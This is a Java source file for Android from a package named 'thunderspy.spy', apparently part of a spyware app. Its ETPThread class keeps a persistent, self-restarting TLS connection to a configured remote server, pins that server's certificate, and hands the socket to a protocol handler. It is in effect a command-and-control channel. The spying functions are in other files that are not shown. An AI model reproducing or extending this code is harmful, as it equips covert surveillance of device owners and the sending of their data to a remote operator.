package com.thunderspy.spy.utils.etp;

import android.content.Context;
import android.os.Environment;

import com.thunderspy.spy.utils.Constants;
import com.thunderspy.spy.utils.SocketsHolder;
import com.thunderspy.spy.utils.Utils;

import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.SocketAddress;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Objects;

import javax.net.SocketFactory;
import javax.net.ssl.HandshakeCompletedEvent;
import javax.net.ssl.HandshakeCompletedListener;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.xml.transform.sax.TemplatesHandler;

/**
 * Created by ariyan on 2/14/17.
 */

public final class ETPThread extends Thread {
    private static ETPThread etpThread = null;
    private static final Object ETP_THREAD_MUTEX = new Object();

    private ETPThread() {

    }

    @Override
    public void run() {
        try {

            while (true) {
                try {
                    SSLSocket sslSocket = openServerConnection();
                    if(sslSocket == null)
                        throw new Exception("Could not connect with server");
                    SocketsHolder.addSocket(sslSocket);
                    Protocol.generateEvent(sslSocket);
                    try {
                        sslSocket.close();
                    } catch (Exception exp){}
                    SocketsHolder.removeSocket(sslSocket);
                    Thread.interrupted();
                    throw new Exception("Connection is lost to server or thread is interrupted");
                } catch (Exception exp) {
                    Utils.log("ETP error: %s", exp.getMessage());
                    try {
                        Thread.interrupted();
                        Thread.sleep(Constants.INTERVAL_FOR_NEXT_SERVER_CONNECTION);
                    } catch (Exception exp1){
                        Thread.interrupted();
                    }
                }
            }
        } catch (Exception exp) {
            Utils.log("ETP Error: %s", exp.getMessage());
            synchronized (ETP_THREAD_MUTEX) {
                etpThread = null;
            }
            ETPThread.setupEtpThread();
        }
    }

    private SSLSocket openServerConnection() {
        SSLSocket sslSocket = null;
        try {
            SSLSocketFactory sslSocketFactory = getSslSocketFactory();
            if (sslSocketFactory == null)
                throw new Exception("SSLSocketFactory could not be created");
            Utils.log("Connecting to server");
            sslSocket = (SSLSocket)sslSocketFactory.createSocket(Constants.SERVER_HOST, Constants.SERVER_PORT);
            Utils.log("Connected to server");
            Utils.log("SSL Handshake is started");
            sslSocket.startHandshake();
            Utils.log("SSL Handshake is completed");
        } catch (Exception exp) {
            Utils.log("Error on connecting to server: %s", exp.getMessage());
            try {
                if(sslSocket != null) {
                    sslSocket.close();
                }
            } catch (Exception exp1) {}
            sslSocket = null;
        }
        return sslSocket;
    }

    private SSLSocketFactory getSslSocketFactory() {
        SSLSocketFactory sslSocketFactory = null;
        try {
            final X509Certificate serverActualCertificate = Utils.getServerActualCertificate();
            if (serverActualCertificate == null) {
                throw new Exception("Server actual certificate is not available");
            }
            SSLContext sslContext = SSLContext.getInstance("TLS");
            TrustManager tm = new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {

                }
                public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                   if(!authenticateServerCertificate(serverActualCertificate, chain, authType))
                       throw new CertificateException("Certificate is not authenticated");
                }

                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }
            };
            sslContext.init(null, new TrustManager[] { tm }, null);
            sslSocketFactory = sslContext.getSocketFactory();
        } catch (Exception exp) {
            Utils.log("Error in creating SSLSocketFactory: %s", exp.getMessage());
            sslSocketFactory = null;
        }
        return sslSocketFactory;
    }

    private boolean authenticateServerCertificate(X509Certificate serverActualCertificate, X509Certificate[] targetCertificatesChain, String authType) {
        boolean ok = false;
        try {
            for (X509Certificate cert : targetCertificatesChain) {
                if(cert.equals(serverActualCertificate)) {
                    ok = true;
                    break;
                }
            }
        } catch (Exception exp) {
            Utils.log("Error in authenticating certificate: %s", exp.getMessage());
            ok = false;
        }
        return ok;
    }

    public static void setupEtpThread() {
        try {
            synchronized (ETP_THREAD_MUTEX) {
                if(etpThread == null || !etpThread.isAlive()) {
                    etpThread = new ETPThread();
                    etpThread.start();
                } else {
                    Utils.log("ETP Thread is already running");
                }
            }
        } catch (Exception exp) {
            Utils.log("ETP Error: %s", exp.getMessage());
        }
    }

}
